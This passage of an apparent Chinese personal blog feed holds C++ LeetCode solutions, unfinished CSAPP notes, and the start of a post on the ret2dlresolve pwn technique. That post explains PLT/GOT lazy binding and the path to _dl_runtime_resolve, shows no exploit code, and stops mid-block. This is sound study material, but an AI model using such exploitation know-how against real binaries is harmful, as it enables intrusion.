height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>,r = height.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> h = <span class="hljs-built_in">min</span>(height[l], height[r]);<br>            <span class="hljs-type">int</span> area = h * (r - l);<br>            ans = <span class="hljs-built_in">max</span>(ans, area);<br><br>            <span class="hljs-keyword">if</span>(height[l] &lt; height[r])&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15.三数之和"></a>15.三数之和</h2><p><img src="/images/22.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">return</span> res;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(),nums.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">2</span>; i++)&#123;<br>            <span class="hljs-type">int</span> l = i + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> r = n - <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//i去重 思考...</span><br>            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>]) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>                <span class="hljs-type">int</span> sum = nums[i] + nums[l] + nums[r];<br>                <span class="hljs-keyword">if</span>(sum == <span class="hljs-number">0</span>)&#123;<br>                    res.<span class="hljs-built_in">push_back</span>(&#123;nums[i],nums[l],nums[r]&#125;);<br>                    <span class="hljs-comment">//l r去重 思索...</span><br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[l] == nums[l + <span class="hljs-number">1</span>]) l++;<br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[r] == nums[r - <span class="hljs-number">1</span>]) r--;<br>                    l++;<br>                    r--;<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; <span class="hljs-number">0</span>)&#123;<br>                    l++;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    r--;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42.接雨水"></a>42.接雨水</h2><p><img src="/images/25.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = height.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> leftmax = <span class="hljs-number">0</span>, rightmax = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(left &lt; right)&#123;<br>            <span class="hljs-keyword">if</span>(height[left] &lt; height[right])&#123;<br>                <span class="hljs-keyword">if</span>(height[left] &gt;= leftmax)&#123;<br>                    leftmax = height[left];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += leftmax - height[left]; <span class="hljs-comment">//思考...</span><br>                &#125;<br>                left++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(height[right] &gt;= rightmax)&#123;<br>                    rightmax = height[right];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += rightmax - height[right]; <span class="hljs-comment">//同理...</span><br>                &#125;<br>                right--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>思索…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>算法</tag>
      
      <tag>双指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>twoSum</title>
    <link href="/2026/01/17/twoSum/"/>
    <url>/2026/01/17/twoSum/</url>
    
    <content type="html"><![CDATA[<p>起因:coding能力太差导致期末考试被制裁</p><p>因此</p><p>今天从<code>LeetCode</code>的第一题<code>两数之和</code>开始<code>数据结构与算法</code>的学习</p><p>首先给出题目</p><p><img src="/images/14.png" alt="6"></p><p>第一个想法是直接两层for循环暴力枚举所有可能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n =nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>                <span class="hljs-keyword">if</span>(nums[i] + nums[j] == target)&#123;<br>                    <span class="hljs-keyword">return</span> &#123;i, j&#125;;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/15.png" alt="6"></p><p>虽然空间复杂度为<code>O(1)</code>，但是这样的话引入了很多无意义比较，比如某个<code>nums[i]</code>可能很小，却和很多不可能匹配的数相加，浪费了许多时间，因此时间复杂度达到了$O(n^2)$，太低效了…</p><p>看看能不能尝试优化一下，减少无意义的搜索</p><p>可以想到先对其进行排序，然后用左右双指针法根据两数之和与<code>target</code>的大小关系移动指针，使其更高效</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        vector &lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; a;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            a.<span class="hljs-built_in">push_back</span>(&#123;nums[i],i&#125;);<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> sum = a[l].first + a[r].first;<br>            <span class="hljs-keyword">if</span>(sum == target)&#123;<br>                <span class="hljs-keyword">return</span> &#123;a[l].second,a[r].second&#125;;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; target)&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/16.png" alt="6"></p><p>此时空间复杂度是<code>O(n)</code></p><p>可以看到确实快了一些，但是还不够，排序的时间复杂度为$O(n \log n)$，能不能不排序，直接实现快速查找？</p><p>这便要引出今天的数据结构:<strong>哈希表</strong></p><p>我们对题目再重新思考一下，题目其实在问，对于每个数<code>x</code>，是否存在一个数<code>y = target - x</code>？</p><p>这本质其实是一个<code>查找</code>问题，而不是<code>枚举</code>问题</p><p>我们可以这样做…</p><p>先遍历数组，对当前<code>nums[i]</code>计算<code>need = target - nums[i]</code>，如果<code>need</code>已经出现过，那么直接返回，否则就把 <code>nums[i]</code>存进<code>哈希表</code></p><p>这样时间复杂度便能达到<code>O(n)</code>，甚至是<code>O(1)</code>！</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        unordered_map &lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp; <span class="hljs-comment">//值，索引</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-type">int</span> need = target - nums[i];<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(need))&#123;<br>                <span class="hljs-keyword">return</span> &#123;mp[need],i&#125;;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                mp[nums[i]] = i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/17.png" alt="6"></p><p>时间复杂度完美，空间复杂度仍然是<code>O(n)</code>，因为哈希表本质就是空间换时间(不绝对)</p><p>待补充…</p><p>2026.1.19</p><p>仅记录一下做过的题目的代码…</p><p>49.字母异位词分组</p><p><img src="/images/18.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;<br>        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;<br><br>        <span class="hljs-keyword">for</span>(string s : strs) &#123;<br>            string key =  s;<br>            <span class="hljs-built_in">sort</span>(key.<span class="hljs-built_in">begin</span>(),key.<span class="hljs-built_in">end</span>());<br>            mp[key].<span class="hljs-built_in">push_back</span>(s); <span class="hljs-comment">//值，索引</span><br>        &#125;<br><br>        vector&lt;vector&lt;string&gt;&gt; result;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; p : mp)&#123;<br>            result.<span class="hljs-built_in">push_back</span>(p.second);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>128.最长连续序列</p><p><img src="/images/19.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestConsecutive</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-function">unordered_set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">st</span><span class="hljs-params">(nums.begin(), nums.end())</span></span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//思考...</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : st) &#123;<br>            <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">count</span>(x - <span class="hljs-number">1</span>)) &#123;<br>                <span class="hljs-type">int</span> cur = x;<br>                <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><br>                <span class="hljs-keyword">while</span> (st.<span class="hljs-built_in">count</span>(cur + <span class="hljs-number">1</span>)) &#123;<br>                    cur++;<br>                    len++;<br>                &#125;<br>                ans = <span class="hljs-built_in">max</span>(ans, len); <span class="hljs-comment">//举一反三</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意一下<code>unordered_map</code>和<code>unordered_set</code>的区别</p><p><code>unordered_set</code>只有key(只关心元素存不存在)，<code>unordered_map</code>存在key-&gt;value的<strong>映射</strong>关系</p><p>哈希表的<code>底层</code>原理:</p><p>桶数组(bucket array) + 哈希函数(<strong>映射</strong>关系) + 链表&#x2F;树?(处理<strong>哈希冲突</strong>) + 负载因子扩容(rehash)</p><p>待补充…</p><p>2026.2.11吐槽:</p><p>最近尝试用cpp手搓一个stl</p><p>被cpp的逆天语法击败了</p><p>怎么会有这么抽象的语言???</p><p>后面写到 map set unordered_map unordered_set 再说</p><p>我才知道这些的底层原理原来还不一样qwq</p><p>还好之前写过红黑树，在密码学中也接触过hash~</p><p>拜拜~</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>哈希表</tag>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>panorama</title>
    <link href="/2026/01/16/panorama/"/>
    <url>/2026/01/16/panorama/</url>
    
    <content type="html"><![CDATA[<p>计算机专业的同学应该都听过一本书，<code>深入理解计算机系统(CSAPP)</code></p><p>其实我很早就开始读了，但是只是囫囵吞枣，根本不知所云，于是便放弃了一段时间。</p><p>现在经历了许多(并非)，对许多名词有了一些概念后，我又重新翻开了这本书，发现许多地方豁然开朗，今天将第一章，<code>计算机系统漫游</code>，也就是标题所说的<code>panorama</code>，总结一下，以遍展开后续的学习。</p><p>以这本书的方式，从你的第一个程序<code>hello</code>的生命周期说起，我们来开始对系统的学习</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>hello</code>这个程序，从被你用编辑器创建，到在系统运行，再到输出信息，最后中止，中间发生了什么？</p><p>首先你用某个编辑器创建了文件<code>hello.c</code>，写下代码，并保存，其被称为<strong>源程序</strong>，储存在<code>磁盘</code>中，实际上就是一个由值0和1组成的<strong>位</strong>(又称比特bit)序列，每8个位被称为一个<strong>字节</strong>，每个字节表示程序中的某些文本字符。</p><p>字符如何和字节所代表的数字序列对应呢，通常采用<code>ASCII标准</code>用数字来表示文本字符，二者一一对应</p><p><img src="/images/10.png" alt="如图所示"></p><p>现在，你应该理解了一个基本思想，计算机系统中所有的信息，无论是磁盘文件，内存中的程序，还是网络上传送的数据，都不过是一串<code>比特</code>。区分不同数据对象的唯一方法是我们读到的这些数据的<code>上下文</code>，在不同的上下文中，一个同样的字节序列可能会有不同的含义，这点要注意。</p><p>那么hello.c是怎么变成可执行文件hello的呢？</p><p><img src="/images/11.png" alt="编译系统"></p><p>如图所示，hello.c经过预处理，编译，汇编，链接，最终得到我们的可执行文件hello</p><p>我就直接引用原文了</p><p><img src="/images/12.png" alt="预处理，编译"></p><p><img src="/images/13.png" alt="汇编，链接"></p><p>其中，编译涉及到优化程序的<strong>性能</strong>，链接过程我是通过<code>pwn</code>中<code>ret2dlresolve</code>这种攻击方式才得以理解，涉及链接过程的细节与机制，以及各种安全问题，可以参考我的另一篇博客，虽然我还没写…</p><p>到这里，便得到了可执行文件<code>hello</code>，接下来运行它时发生了什么？</p><p>在终端中可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux&gt; ./hello<br>Hello,World!<br>linux&gt; <br></code></pre></td></tr></table></figure><p>累了，休息，有空再写…</p><p>暂时懒得写</p><p>以后再说!</p><p>加油！</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>panorama</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="/2026/01/15/ret2dlresolve/"/>
    <url>/2026/01/15/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<p>关于动态链接与延迟绑定</p><p>想起来再写…</p><p>时隔多年终于打算写了，之前认为这个方法比较抽象就没有深入研究，最近打比赛遇到没有gadget的题目时我的傲慢终于付出了代价</p><p>不过一切都不算太迟，现在来看看吧…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello ret2dlresolve!&quot;</span>);<br></code></pre></td></tr></table></figure><p>在c语言中写下这个句子，观察其汇编代码会看到有这么一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">call printf@plt &lt;printf@plt&gt;<br></code></pre></td></tr></table></figure><p>这个过程到底发生了什么?</p><p>先来了解一下历史吧…</p><p>你应该知道<code>printf</code>是一个库函数，早期，所有库函数在编译期直接拷贝进可执行文件，导致了大量的资源浪费与高额的维护成本</p><p>于是，人们引入了<strong>共享库</strong>的概念，就是我们常看到的<code>libc.so.6</code>，核心思想是多个程序共享同一份代码</p><p>但问题随之而来，程序在编译时根本不知道<code>libc</code>会被加载到哪个地址，函数地址只有在程序运行时才能确定</p><p>最原始的解决方法是这样的，动态链接器(<code>ld-linux-x86-64.so.2</code>)在程序刚启动时，就把用到的所有库函数地址全算一遍，这就是<code>eager binding</code>(立即绑定)，很明显，这样做启动极慢，且大量函数可能一辈子都不会被调用，耗费大量性能</p><p>因此，聪明的工程师们提出了一个非常朴素但革命性的想法，既然很多函数根本不会用到，那为什么要一开始就解析?</p><p>于是便引入了这样的做法，程序启动时，一个函数都不解析，只有当第一次调用某函数时，才去问动态链接器它在哪，这就是<strong>lazy binding</strong>(<code>延迟绑定</code>)!</p><p>为了延迟绑定，<code>ELF</code>文件引入了<code>GOT</code>,<code>PLT</code>,<code>重定位表</code>,<code>dynsym</code>,<code>dynstr</code>等各种乱七八糟的名词，直接看似乎有点抽象，我们去gdb中看看怎么个事儿???</p><p>先从宏观看吧，自顶向下</p><p>回到<code>call printf@plt &lt;printf@plt&gt;</code>，我们si步进一下</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401040 &lt;printf@plt&gt;      endbr64<br>0x401044 &lt;printf@plt+4&gt;    jmp qword ptr [rip + 0x2fb6] &lt;0x401030&gt;<br></code></pre></td></tr></table></figure><p>继续ni步过</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401030   endbr64<br>0x401034   push 0<br>0x401039   jmp 0x401020<br></code></pre></td></tr></table></figure><p>你应该知道，PLT相当于一个跳板，jmp跳转到printf在GOT里存的地址，然而目前是第一次调用printf，GOT中还没有加载其在libc中的真实地址，因此此时该GOT表项被初始化为指向PLT的公共解析入口<code>resolver stub</code>(PLT[0])，也就是你看到的0x401020，它是通向动态链接器的唯一入口，比较重要，而后面从PLT[1]开始，每个PLT表项对应一个外部函数，如PLT[1]对应printf，PLT[3]对应read，同一个函数的PLT表项中，<code>硬编码</code>了它在<code>.rela.plt</code>中的索引，但在真正<strong>延迟绑定</strong>的过程中，真正用于符号解析的还是<code>.rela.plt</code>中的重定位索引，而非PLT表项的编号本身</p><p>也就是这个<code>push 0</code>，这便是关键的<strong>重定位表索引</strong>(relocation index)，动态链接器正是通过该索引，在重定位表中定位到对应的重定位条目，并由该条目进一步确定其所需要解析的符号描述信息(<code>.dynsym</code> <code>.dynstr</code>)，对于其它通过PLT延迟绑定的函数，比如read，假设是<code>push 2</code>好了，其对应的PLT表项中会压入不同的索引值(此时是PLT[3])，该索引在链接阶段已确定，并与<code>.rela.plt</code>中的条目一一对应，而与函数的实际调用顺序无关…</p><p>继续ni，看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x401020   push qword ptr [rip + 0x2fca]   # link_map 指针<br>0x401026   jmp  qword ptr [rip + 0x2fcc] &lt;0x7ffff7fda2f0&gt; # ld-linux-x86-64.so.2: _dl_runtime_resolve<br></code></pre></td></tr></table></figure><p>额讲不下去了</p><p>我自己都觉得有点抽象…</p><p>算了来看看实际的例子吧</p><p>首先是GOT表，分为两部分，<code>.got</code>和<code>.got.plt</code>，<code>.got</code>是全局变量重定位，用于全局变量、静态数据的重定位，程序启动时一次性解析完成，不管</p><p><code>.got.plt</code>才是我们关注的GOT</p><p>结构大致是这样的</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">GOT</span>[<span class="hljs-number">0</span>]: .dynamic节的地址(动态链接信息) #不管<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">1</span>]: link_map 结构地址(链接器内部数据结构) #重要<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">2</span>]: <span class="hljs-symbol">_dl_runtime_resolve</span> 函数地址(动态解析函数) #重要(你猜ret2dlresolve这个名字怎么来的)<br><br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">3</span>]: 第一个动态链接函数(如printf)的地址槽<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">4</span>]: 第二个动态链接函数(如read)的地址槽<br><span class="hljs-symbol">GOT</span>[<span class="hljs-number">5</span>]: 第三个动态链接函数...<br>...<br></code></pre></td></tr></table></figure><p>在实际的内存布局中大致是这样的(地址随便编的)</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ldif">.got.plt 节：<br><span class="hljs-attribute">0x600e00</span>: 0x0000000000400390  <span class="hljs-comment"># GOT[0] - .dynamic地址</span><br><span class="hljs-attribute">0x600e08</span>: 0x00007ffff7ffe170  <span class="hljs-comment"># GOT[1] - link_map</span><br><span class="hljs-attribute">0x600e10</span>: 0x00007ffff7fe9770  <span class="hljs-comment"># GOT[2] - _dl_runtime_resolve</span><br><span class="hljs-attribute">0x600e18</span>: 0x0000000000400596  <span class="hljs-comment"># GOT[3] - printf(初始指向PLT+6)</span><br><span class="hljs-attribute">0x600e20</span>: 0x00007ffff7a7c690  <span class="hljs-comment"># GOT[4] - read(已解析，现存放真实地址)</span><br>...<br></code></pre></td></tr></table></figure><p>PLT表结构是这样的</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">PLT</span>[<span class="hljs-number">0</span>]: 动态链接器入口(公共桩代码)resolver stub<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">1</span>]: 第一个动态函数(如printf)的桩代码<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">2</span>]: 第二个动态函数(如read)的桩代码<br><span class="hljs-symbol">PLT</span>[<span class="hljs-number">3</span>]: 第三个动态函数...<br>...<br></code></pre></td></tr></table></figure><p>具体的代码即是</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 